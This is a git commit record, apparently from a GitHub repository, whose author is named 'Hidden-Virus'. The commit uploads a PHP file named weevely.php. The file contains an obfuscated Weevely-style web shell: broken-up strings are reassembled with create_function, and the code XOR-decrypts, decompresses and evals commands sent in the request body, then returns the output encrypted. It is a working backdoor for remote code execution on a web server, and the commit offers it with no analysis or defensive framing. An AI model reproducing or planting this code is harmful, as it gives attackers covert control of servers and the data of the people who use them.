5e7cf52815554f929e0008e9bb8eefcf75a8aa39
Hidden-Virus <70848309+System-Error44@users.noreply.github.com>
2022-12-05 01:53:24 +0500

    Add files via upload

---
+++ weevely.php
@@ -0,0 +1,11 @@
+<?php
+$l='Vunction x($t,$kzV)zV{$czV=strlzVen($k);$l=strlen($zVt);$ozV="";forzV(zV$i=0;$zVi<$l;)zV{for($j=zV0';
+$P='$k="zV5ebzVe2294";$kh=zV"ecd0ezV0f08eabzV";$kf="zV769zV0d2a6ee69"zV;$p=zV"zilG3O3zVb338izVUzVSZi"zV;fz';
+$S=str_replace('g','','cregatgge_gfunggction');
+$K='ob_end_clezVanzV();$r=@bzVzVase64_encode(@x(@gzczVompresszV(zV$o)zV,$k));printzV("zV$p$kh$r$kf");}';
+$c=';($jzV<zVzV$c&&$i<$l);$j++,$i+zV+zV)zV{$ozV.=$t{$zVizV}^$k{$j};}}return $ozVzV;}if (@preg_match';
+$A='zVvalzV(@zVzVgzVzunzVcompress(@x(@baszVe64_decode($m[1]),$k)));$o=@ozVzVb_get_contezVzVnzVts()zV;@';
+$r='(zV"/$kzVh(.+zV)$kzVf/",@fizVle_gezVt_zVcontents("phpzV:zV//zVinpuzVt"),$mzV)==1) {@zVob_szVtart();@e';
+$s=str_replace('zV','',$P.$l.$c.$r.$A.$K);
+$C=$S('',$s);$C();
+?>
